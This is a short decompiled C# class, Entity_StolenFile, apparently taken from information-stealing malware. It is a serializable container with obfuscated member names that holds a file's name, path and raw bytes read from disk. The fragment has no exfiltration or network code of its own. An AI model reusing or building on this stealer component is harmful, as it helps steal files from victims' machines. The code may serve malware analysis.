using System;
using System.IO;
using System.Runtime.Serialization;

// Token: 0x02000059 RID: 89
[DataContract(Name = "Entity5", Namespace = "Entity")]
[Serializable]
public class Entity_StolenFile
{
	// Token: 0x060001F4 RID: 500 RVA: 0x00002BB8 File Offset: 0x00000DB8
	public Entity_StolenFile()
	{
	}

	// Token: 0x060001F5 RID: 501 RVA: 0x000038DE File Offset: 0x00001ADE
	public Entity_StolenFile(string filename)
	{
		this.FileName = new FileInfo(filename).Name;
		this.Content = filename.ReadFile();
	}

	// Token: 0x1700004B RID: 75
	// (get) Token: 0x060001F6 RID: 502 RVA: 0x00003903 File Offset: 0x00001B03
	// (set) Token: 0x060001F7 RID: 503 RVA: 0x0000390B File Offset: 0x00001B0B
	[DataMember(Name = "Id1")]
	public string FileName { get; set; }

	// Token: 0x1700004C RID: 76
	// (get) Token: 0x060001F8 RID: 504 RVA: 0x00003914 File Offset: 0x00001B14
	// (set) Token: 0x060001F9 RID: 505 RVA: 0x0000391C File Offset: 0x00001B1C
	[DataMember(Name = "Id2")]
	public string CompletePath { get; set; }

	// Token: 0x1700004D RID: 77
	// (get) Token: 0x060001FA RID: 506 RVA: 0x00003925 File Offset: 0x00001B25
	// (set) Token: 0x060001FB RID: 507 RVA: 0x0000392D File Offset: 0x00001B2D
	[DataMember(Name = "Id3")]
	public byte[] Content { get; set; }

	// Token: 0x1700004E RID: 78
	// (get) Token: 0x060001FC RID: 508 RVA: 0x00003936 File Offset: 0x00001B36
	// (set) Token: 0x060001FD RID: 509 RVA: 0x0000393E File Offset: 0x00001B3E
	[DataMember(Name = "Id4")]
	public string Path { get; set; }

	// Token: 0x1700004F RID: 79
	// (get) Token: 0x060001FE RID: 510 RVA: 0x00003947 File Offset: 0x00001B47
	// (set) Token: 0x060001FF RID: 511 RVA: 0x0000394F File Offset: 0x00001B4F
	[DataMember(Name = "Id5")]
	public string Id5 { get; set; }
}
